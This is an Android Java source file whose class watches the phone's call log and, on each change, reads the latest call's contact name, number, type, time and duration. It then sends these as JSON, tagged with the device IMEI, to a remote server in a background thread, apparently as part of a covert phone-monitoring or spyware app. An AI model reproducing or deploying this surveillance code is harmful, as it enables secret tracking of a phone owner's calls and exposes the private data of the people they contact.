package com.phone.data;


import org.json.JSONArray;
import org.json.JSONObject;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.util.Log;


public class CallLogContentObserver extends ContentObserver implements Runnable{
	private final String TAG = "CallLogContentObserver";
    private Handler mHandler = null;
    private Context mContext = null;

    public static CallLogContentObserver gCallLogContentObserver= null;

   

	public CallLogContentObserver(Handler handler, Context context) {
	    super(handler);
	    this.mHandler = handler;
	    this.mContext = context;
	}



	public void onChange(boolean selfChange) {
	    super.onChange(selfChange);
	    Log.e(TAG,"onChange");
	
	    try{
		
			ContentResolver cr = mContext.getContentResolver();
			Cursor cs=cr.query(CallLog.Calls.CONTENT_URI, 
		          new String[]{CallLog.Calls.CACHED_NAME,  
		                     CallLog.Calls.NUMBER,   
		                     CallLog.Calls.TYPE,  
		                     CallLog.Calls.DATE,  
		                     CallLog.Calls.DURATION         
		                     },null,null,CallLog.Calls.DEFAULT_SORT_ORDER);
		   
			if(cs!=null &&cs.getCount()>0){
				for(cs.moveToFirst(); ; ){
		              String callName=cs.getString(0);
		              String callNumber=cs.getString(1);
	
		              int callType=Integer.parseInt(cs.getString(2));
		              String callTypeStr="";
		              switch (callType) {
		              case CallLog.Calls.INCOMING_TYPE:
		                  callTypeStr="呼入";
		                  break;
		              case CallLog.Calls.OUTGOING_TYPE:
		                  callTypeStr="呼出";
		                  break;
		              case CallLog.Calls.MISSED_TYPE:
		                  callTypeStr="未接";
		                  break;
		              }
		
		              String callDateStr = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss",Long.parseLong(cs.getString(3)));
		
		              String callDurationStr = cs.getString(4);
		              if(callDurationStr == null){
		            	  callDurationStr = "0分0秒";
		              }else{
			              int callDuration=Integer.parseInt(callDurationStr);
			              int min=callDuration/60;
			              int sec=callDuration%60;
			              callDurationStr=min+"分"+sec+"秒";
		              }
		              
		              
		    	   	  JSONObject jsobj=new JSONObject();
		    	   	  jsobj.put("类型", callTypeStr);
		    	   	  jsobj.put("姓名", callName);
		    	   	  jsobj.put("号码", callNumber);
		    	   	  jsobj.put("时间", callDateStr);
		    	   	  jsobj.put("时长", callDurationStr);
		    	   	  JSONArray jsarray = new JSONArray();
		    	   	  jsarray.put(0,jsobj);
		    	   	  
		    	   	  
			    	  SendDataToServer sendmsg = new SendDataToServer(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, 
			    			  Public.CMD_DATA_NEWCALLLOG, Public.IMEI);
			    	  Thread threadsendloc = new Thread(sendmsg);
			    	  threadsendloc.start();

		              break;
				}
				cs.close();
		   }
	    }catch(Exception ex){
	    	ex.printStackTrace();
	    }
	}
	
	@Override
    public void run(){
    	try {
        	Looper.prepare();
        	
        	ContentResolver cr = mContext.getContentResolver();
    		if (gCallLogContentObserver == null) {
    			gCallLogContentObserver = new CallLogContentObserver(mHandler,mContext);
    		}
    		
			cr.registerContentObserver(Uri.parse("content://call_log/calls"), true,gCallLogContentObserver);
			
    		Looper.loop();
		} catch (Exception e) {
			e.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(e);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("calllog exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}

    }
}


